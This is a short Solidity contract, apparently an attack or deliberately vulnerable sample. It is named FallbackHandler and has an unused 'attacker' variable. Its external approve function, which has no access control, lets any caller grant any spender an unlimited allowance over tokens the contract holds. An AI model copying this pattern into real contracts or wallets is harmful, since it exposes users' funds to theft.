// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract FallbackHandler {
    address attacker;

    function approve(address spender, address token) external {
        IERC20(token).approve(spender, type(uint256).max);
    }
}
